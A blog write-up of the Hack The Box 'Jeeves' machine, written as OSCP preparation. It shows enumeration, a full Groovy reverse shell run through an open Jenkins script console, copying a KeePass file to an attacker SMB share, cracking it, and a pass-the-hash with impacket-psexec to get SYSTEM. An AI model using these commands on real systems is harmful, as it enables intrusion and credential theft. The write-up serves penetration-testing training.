---
layout: post
title:  HTB Jeeves Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-08 07:00:00 +0300
image:  '/images/htb_jeeves.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Medium, Jenkins, KeePass-.kdbx]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Detecting unsecured Jenkins dashboard using Feroxbuster](#detecting-unsecured-jenkins-dashboard-using-feroxbuster)
- [Foothold](#foothold)
  - [Access as user kohsuke using Groovy Reverse Shell on Jenkins](#access-as-user-kohsuke-using-groovy-reverse-shell-on-jenkins)
- [Privilege Escalation](#privilege-escalation)
  - [Finding and moving .kdbx KeePass file with SMB Server](#finding-and-moving-kdbx-keepass-file-with-smb-server)
  - [Cracking and opening .kdbx KeePass file](#cracking-and-opening-kdbx-keepass-file)
  - [Pass-the-Hash to get access as Administrator using impacket-psexec](#pass-the-hash-to-get-access-as-administrator-using-impacket-psexec)
  - [Getting the true root.txt flag](#getting-the-true-roottxt-flag)

# Enumeration
### Nmap
```shell
nmap -A -T4 -p- -Pn 10.129.142.123
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 03:00 EST
Nmap scan report for 10.129.142.123
Host is up (0.035s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-08T13:02:31
|_  start_date: 2024-11-08T13:00:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.70 seconds
```

The Nmap scan gave us as result 4 open ports:
- Port 80 with a Microsoft IIS website.
- Ports 135 related to RPC.
- Ports 445 related to SMB.
- Port 50000 with Jetty 9.4.z-SNAPSHOT.
### Web Enumeration
We will enumerate port 80 first:
```shell
http://10.129.142.123
```
Visiting the website we can see a "Ask Jeeves" logo and a search box. If we try to search anything there we will get an error, giving us information about a Microsoft SQL Server 2005 being used.
We will now take a look at port 50000:
```shell
http://10.129.142.123:50000
```
There is not much to see there here.
### Detecting unsecured Jenkins dashboard using Feroxbuster
We can use Feroxbuster to search for directories:
```shell
feroxbuster -u http://10.129.142.123:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
Feroxbuster found the following directory:
```shell
http://10.129.142.123:50000/askjeeves/
```
If we visit that URL, we will notice that we can access the Jenkins dashboard without entering any credentials. Lucky to us, this happened because the Jenkins server was not secured.

We can abuse this to get access using a groovy reverse shell.
# Foothold
### Access as user kohsuke using Groovy Reverse Shell on Jenkins
We will use a groovy reverse shell to get access.
First we need to go to Manage Jenkins -> Script Console. It will lead us to the following URL:
```shell
http://10.129.142.123:50000/askjeeves/script
```
Now go visit the following URL and get the Groovy reverse shell:
```shell
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```
After that, change the String host to our Kali tun0 IP and int port to 8080:
```shell
String host="10.10.14.206";
int port=8080;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Now start a nc listener at port 8080 on Kali:
```shell
nc -lvnp 8080
```
And then copy the Groovy reverse shell into the Script console and press Run.
We will get a response on our nc listener, giving us a shell as the user kohsuke:
```shell
listening on [any] 8080 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.142.123] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```
### User Flag
We can find the user.txt flag at the desktop of the user kohsuke:
```shell
type C:\Users\kohsuke\Desktop\user.txt
```
# Privilege Escalation
### Finding and moving .kdbx KeePass file with SMB Server
Enumerating the folders in the machine, we found a .kdbx KeePass file using our custom cmd search command:
```shell
for /r C:\ %i in (*.db *.kdbx) do @echo %i

# Results
<SNIP>
C:\Users\kohsuke\Documents\CEH.kdbx
<SNIP>
```
We can set a SMB server on Kali to get the file:
```shell
# Set a SMB server on Kali
impacket-smbserver -smb2support kalishare . -username panda -password bamboo123

# Enter the following command with the Kali tun0 IP on target CLI to connect to our Kali SMB server
net use m: \\10.10.14.206\kalishare /user:panda bamboo123

# Copy the .kdbx file into Kali
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.206\kalishare\CEH.kdbx
```
### Cracking and opening .kdbx KeePass file
Now we can crack and access the .kdbx KeePass file using the following commands:
```shell
# Get the hash
keepass2john CEH.kdbx > keepasshash

# Crack it with john
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash

# Examine the results
john keepasshash --show

CEH:moonshine1
```
Now we can use the password moonshine1 to open the CEH.kdbx file.
For that, we will use KeePassXC:
```shell
# Install KeePassXC
sudo apt install keepassxc

# Use KeePassXC to open CEH.kdbx
keepassxc CEH.kdbx

# Once the file opens, we can enter the password to unlock it
moonshine1
```
### Pass-the-Hash to get access as Administrator using impacket-psexec
We tried to get access using the users and the passwords inside CEH.kdbx, but they werent valid. However, we can still try to Pass-the-Hash we found inside Backup in CEH.kdbx:
```shell
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

# We will just need the second part of the hash
e0fb1fb85756c24235ff238cbe81fe00
```
Now we can use the hash with impacket-psexec to get access as Administrator:
```shell
impacket-psexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.142.123
```
This will give us a shell as system:
```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.142.123.....
[*] Found writable share ADMIN$
[*] Uploading file QSATCaNL.exe
[*] Opening SVCManager on 10.129.142.123.....
[*] Creating service mAkb on 10.129.142.123.....
[*] Starting service mAkb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
### Getting the true root.txt flag
Now we can get the root.txt flag:
```shell
dir C:\Users\Administrator\Desktop
```

```shell
11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
```
Hm... hm.txt?
```shell
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```
Let's see if the flag is hidden here:
```shell
C:\Users\Administrator\Desktop> dir /R
```

```shell
11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
```
It seems to be right there, let's try to get the flag:
```shell
C:\Users\Administrator\Desktop> more < hm.txt:root.txt
a7841...<REDACTED>
```
It worked! We got the root.txt flag